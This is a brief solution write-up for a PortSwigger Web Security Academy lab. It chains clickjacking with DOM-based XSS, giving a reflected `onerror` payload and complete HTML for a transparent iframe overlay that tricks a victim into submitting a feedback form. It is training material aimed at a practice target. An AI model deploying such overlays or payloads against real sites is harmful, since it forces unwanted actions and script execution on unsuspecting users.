# Lab 05 — Exploiting clickjacking vulnerability to trigger DOM-based XSS

> **Expert** · [Official lab](https://portswigger.net/web-security/clickjacking/lab-exploiting-to-trigger-dom-based-xss)

**Entry point:** the feedback form reflects parameters into a DOM sink —
chain clickjacking to make the victim trigger it.

## Solution

1. The feedback page renders `name` unencoded into a DOM XSS sink
   (`?name=<img src=1 onerror=print()>`).
2. Host the overlay with the poisoned feedback URL inside the iframe:

```html
<style>
  iframe { position: relative; width: 700px; height: 500px;
           opacity: 0.0001; z-index: 2; }
  div    { position: absolute; top: 610px; left: 80px; z-index: 1; }
</style>
<div>Click me</div>
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/feedback?name=<img src=1 onerror=print()>&email=hacker@attacker-website.com&subject=test&message=test#feedbackResult"></iframe>
```

3. Align the decoy over the **Submit feedback** button, then deliver — the
   victim's click submits the feedback and the XSS fires in their browser —
   lab solved.
